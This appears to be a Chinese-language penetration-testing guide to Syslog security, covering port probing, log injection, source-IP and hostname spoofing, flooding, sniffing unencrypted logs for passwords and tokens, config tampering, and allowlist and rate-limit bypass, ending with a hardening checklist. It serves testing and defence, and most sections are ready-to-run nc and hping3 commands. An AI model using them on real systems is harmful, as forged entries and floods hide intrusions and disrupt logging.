# Syslog 安全测试 (Syslog Security Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供 Syslog 协议和实现的安全测试方法论，帮助测试人员评估 Syslog 基础设施的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- Syslog 服务器安全配置测试
- Syslog 协议安全评估
- 日志传输完整性验证
- 网络设备日志安全测试

### 1.3 读者对象
- 渗透测试工程师
- 网络安全分析师
- 系统管理员
- 安全架构师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

Syslog 是一种标准的日志传输协议，广泛用于网络设备和系统日志的集中收集。Syslog 安全测试关注协议实现、配置和传输过程中的安全问题。

**核心原理：**
- **UDP Syslog 无连接**：默认使用 UDP 514 端口，无连接确认，易被伪造和拦截
- **TCP Syslog 风险**：虽然使用 TCP 但仍可能无加密
- **TLS Syslog**：使用 TCP 6514 端口，提供加密但配置可能不当
- **消息格式问题**：Syslog 消息格式可被注入和篡改

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **网络设备日志** | 路由器、交换机日志 | UDP syslog 可被伪造 |
| **服务器日志聚合** | rsyslog、syslog-ng | 配置错误导致信息泄露 |
| **安全设备日志** | 防火墙、IDS 日志 | 日志篡改绕过检测 |
| **容器平台日志** | Kubernetes、Docker | 日志驱动配置错误 |
| **云基础设施** | 云服务商日志 | 日志传输未加密 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**Syslog 服务探测：**
```bash
# 扫描 Syslog 端口
nmap -sU -p 514 target
nmap -sT -p 6514 target

# 检测 Syslog 服务类型
# UDP
echo "<14>Test message" | nc -u target 514

# TCP
echo "<14>Test message" | nc target 514

# TLS
openssl s_client -connect target:6514
```

**Syslog 注入测试：**
```bash
# 测试日志注入
# 换行符注入
echo "<14>Test%0a2024-01-01%20Fake%20Entry" | nc -u target 514

# 特殊字符注入
echo "<14>Test message with \x00 null" | nc -u target 514

# 长消息测试
python3 -c "print('<14>' + 'A'*10000)" | nc -u target 514
```

**Syslog 伪造测试：**
```bash
# 伪造源 IP
echo "<14>Test message" | nc -u -s 192.168.1.100 target 514

# 伪造主机名
echo "<14>$(hostname -f) Test message" | nc -u target 514

# 伪造设施级别
# <PRI> = Facility * 8 + Severity
# Facility 1 (user), Severity 0 (emergency) = 8
echo "<8>Emergency message" | nc -u target 514
```

#### 2.3.2 白盒测试

**配置审计：**
```bash
# rsyslog 配置检查
cat /etc/rsyslog.conf
cat /etc/rsyslog.d/*.conf

# 危险配置示例
# 1. 无加密传输
*.* @remote-syslog-server:514

# 2. 无认证
# 3. 接受所有来源
$AllowedSender UDP, 0.0.0.0/0

# 4. 日志存储权限过宽
$FileOwner root
$FileGroup adm
$FileCreateMode 0644  # 应为 0640 或更严格
```

```bash
# syslog-ng 配置检查
cat /etc/syslog-ng/syslog-ng.conf

# 危险配置示例
source s_network {
    network(ip(0.0.0.0) port(514));  # 接受所有来源
};
```

### 2.4 漏洞利用方法

#### 2.4.1 Syslog 注入攻击

```bash
# 日志条目注入
# 插入虚假日志条目
echo "<14>Jan  1 00:00:00 server1 sshd[1234]: Accepted password for admin from 10.0.0.1" | nc -u target 514

# 修改现有日志含义
# 通过精确控制时间戳和内容
```

**Syslog 洪水攻击：**
```bash
# 消耗日志存储资源
for i in {1..1000000}; do
    echo "<14>Attack message $i" | nc -u target 514
done

# 可能导致：
# 1. 磁盘空间耗尽
# 2. 日志服务崩溃
# 3. 合法日志被覆盖
```

#### 2.4.2 Syslog 窃听

```bash
# 如果 Syslog 未加密
# 网络抓包
tcpdump -i eth0 -n port 514 -w syslog_capture.pcap

# 分析捕获的日志
tcpdump -r syslog_capture.pcap -A

# 提取敏感信息
strings syslog_capture.pcap | grep -iE "password|token|secret"
```

#### 2.4.3 Syslog 服务器攻击

```bash
# rsyslog 漏洞利用
# 检查版本
rsyslogd -v

# 查找已知漏洞
# CVE-2022-24903: rsyslog 缓冲区溢出

# 配置篡改（如果有写权限）
echo "*.* /var/log/attacker.log" >> /etc/rsyslog.conf
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过源 IP 检查

```bash
# 如果配置了 AllowedSender
# 方法 1：IP 欺骗
hping3 --udp --destport 514 --spoof 192.168.1.100 target

# 方法 2： compromised 内部主机
# 先攻陷允许的主机，然后从该主机发送
```

#### 2.5.2 绕过速率限制

```bash
# 如果 Syslog 服务器有速率限制
# 使用多个源 IP 发送
for ip in $(cat ip_list.txt); do
    echo "<14>Message" | nc -u -s $ip target 514 &
done
```

---

## 第三部分：附录

### 3.1 Syslog 安全配置检查清单

| **配置项** | **安全设置** | **风险说明** |
| :--- | :--- | :--- |
| 传输协议 | TCP-TLS (6514) | UDP/TCP 明文可被窃听 |
| 源 IP 限制 | 白名单 | 接受所有来源可被注入 |
| 消息认证 | 启用 | 防止伪造 |
| 存储权限 | 0640 或更严格 | 防止未授权访问 |
| 速率限制 | 启用 | 防止洪水攻击 |

### 3.2 Syslog 设施/级别速查表

| **Facility** | **代码** | **Severity** | **代码** |
| :--- | :--- | :--- | :--- |
| kern | 0 | Emergency | 0 |
| user | 1 | Alert | 1 |
| mail | 2 | Critical | 2 |
| daemon | 3 | Error | 3 |
| auth | 4 | Warning | 4 |
| local0-local7 | 16-23 | Notice | 5 |
| | | Info | 6 |
| | | Debug | 7 |

### 3.3 参考资源

- [RFC 5424 - Syslog Protocol](https://datatracker.ietf.org/doc/html/rfc5424)
- [RFC 5425 - TLS Transport for Syslog](https://datatracker.ietf.org/doc/html/rfc5425)
- [rsyslog Documentation](https://www.rsyslog.com/doc/)
- [CWE-778: Insufficient Logging](https://cwe.mitre.org/data/definitions/778.html)
